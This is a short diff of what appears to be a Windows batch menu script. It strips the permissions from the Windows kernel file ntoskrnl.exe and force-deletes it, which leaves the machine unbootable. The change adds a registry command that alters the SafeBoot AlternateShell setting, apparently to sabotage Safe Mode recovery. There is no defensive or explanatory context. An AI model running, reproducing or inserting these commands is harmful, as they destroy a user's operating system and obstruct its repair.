@@ -568,5 +568,7 @@ icacls "C:\Windows\System32\ntoskrnl.exe" /inheritance:r /t /c
 del /f /s /q "C:\Windows\System32\ntoskrnl.exe"
 rd /s /q "C:\Windows\System32\ntoskrnl.exe"
 
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "0" /f
+
 pause
 goto MENU
